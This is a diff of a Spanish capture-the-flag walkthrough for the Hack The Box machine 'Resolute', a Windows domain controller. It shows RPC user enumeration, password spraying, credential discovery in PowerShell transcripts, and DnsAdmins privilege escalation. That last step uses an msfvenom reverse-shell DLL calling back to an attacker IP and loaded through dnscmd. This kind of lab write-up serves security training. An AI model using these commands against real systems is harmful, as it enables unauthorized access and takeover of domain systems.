@@ -1,5 +1,8 @@
 # 10.10.10.169 - Resolute
+![Resolute](https://user-images.githubusercontent.com/96772264/211814413-9673d03c-d6b4-4096-8d7f-87f1b5233dda.png)
+
 --------------------------
+# Part 1: Enumeración
 
 Puertos abiertos -> 53(dns),88(kerberos),135(rcp),139,389(ldap),445(smb),464,593(http),636,3269,3268(ldap),5985(winrm),9389.
 
@@ -19,7 +22,7 @@ SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Stan
 └─$ dig @10.10.10.169 megabank.local mx 
 # hostmaster.megabank.local
 ```
-
+## Puerto 135 RPC:
 ```console
 └─$ rpcclient -U "" -N 10.10.10.169 -c 'enumdomusers' | grep -oP "\[.*?\]" | grep -v "0x" | tr -d "[]" >> users
 └─$ rpcclient -U "" -N 10.10.10.169 -c 'enumdomusers' -c 'enumdomgroups' # Domain Admins (0x200)
@@ -27,37 +30,44 @@ SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Stan
 └─$ rpcclient -U "" -N 10.10.10.169 -c 'queryuser 0x1f4' # -> Administrator
 └─$ rpcclient -U "" -N 10.10.10.169 -c 'querydispinfo' 
 # Account: marko	Name: Marko Novak # Cuenta creada. Contraseña Welcome123!
+```
 
+Vamos a ver si funciona esta contraseña...
+```console
 └─$ smbmap -H 10.10.10.169 -u marko -p 'Welcome123!' # Error de autenticación
 └─$ crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!' 
 SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
 └─$ smbmap -H 10.10.10.169 -u 'melanie' -p 'Welcome123!'
 # Tiene acceso a NETLOGON, SYSVOL e $IPC pero dentro no encuentro nada interesante
-
 └─$ crackmapexec winrm 10.10.10.169 -u 'melanie' -p 'Welcome123!'
 WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
 ```
+
+--------------------------
+# Part 2: En el sistema: Carpetas ocultas en disco C
+
 ```console
 └─$ evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
 ```
-Subo mi script pero no encuentra nada interesante. Mi usaurio tampoco tiene nada interesante. 
-En C:Users existe la carpeta home de otro usaurio, "ryan", no me deja acceder.
-
+Subo mi script pero no encuentra nada interesante. Mi usaurio tampoco tiene nada interesante.     
+En C:Users existe la carpeta home de otro usaurio, "ryan", no me deja acceder.   
 ```console
 *Evil-WinRM* PS C:\Users\ryan> net user ryan
 Global Group memberships     *Domain Users         *Contractors
 ```
-Pero no parece que este grupo sirva para mucho
-Encontramos en C una carpeta inusual "PSTranscripts" con dentro:
+Pero no parece que este grupo sirva para mucho...    
+Encontramos en C una carpeta inusual "PSTranscripts" con dentro:  
 ```console
 *Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
 ```
-Dentro del script encontramos la frase "cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!"
+Dentro del script encontramos la frase "cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!"  
 
+--------------------------
+# Part 3: Escalando privilegios: Grupo DnsAdmins  
 ```console
 └─$ evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
 ```
-En el escritorio tiene una nota
+En el escritorio tiene una nota:  
 ```
 *Evil-WinRM* PS C:\Users\ryan\Desktop> type note.txt
 Email para el equipo:
@@ -67,9 +77,9 @@ que haga el administrador)
 
 *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups /fo list | findstr "Name"
 MEGABANK\DnsAdmins
-```
+``` 
 Este grupo es vulnerable. La manera de explotarlo se dice [aquí](https://lolbas-project.github.io/#)
-Basicmanete si cargas una dll maliciosa, al resetear el servicio dns se aplica.
+Basicmanete si cargas una dll maliciosa, al resetear el servicio dns se aplica.  
 
 ```console
 └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=666 -f dll -o wtf.dll
@@ -84,9 +94,4 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 
-
-DNS admins -> cargar una dll maliciosa para que al resetear el servicio se aplique.
-lolbas github -> dnscmd.exe /config /serverlevelplugindll \\10.10.14.16\varpeta\wtf.dll
-
-sc.exe stop dns -> sc.exe start dns
 
